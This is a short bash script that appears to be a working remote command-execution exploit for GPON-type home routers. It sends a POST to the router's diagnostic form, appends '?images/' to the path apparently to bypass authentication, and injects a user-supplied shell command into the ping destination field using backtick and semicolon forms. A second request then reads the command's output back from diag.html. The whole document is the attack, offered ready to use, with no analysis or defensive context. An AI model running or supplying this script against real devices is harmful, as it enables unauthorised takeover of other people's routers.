#!/bin/bash

echo "[+] Sending the Command… "
# We send the commands with two modes backtick (`) and semicolon (;) because different models trigger on different devices
curl -k -d "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=\`$2\`;$2&ipv=0" $1/GponForm/diag_Form?images/ 2>/dev/null 1>/dev/null
echo "[+] Waiting…."
sleep 3
echo "[+] Retrieving the ouput…."
curl -k $1/diag.html?images/ 2>/dev/null | grep ‘diag_result = ‘ | sed -e ‘s/\\n/\n/g’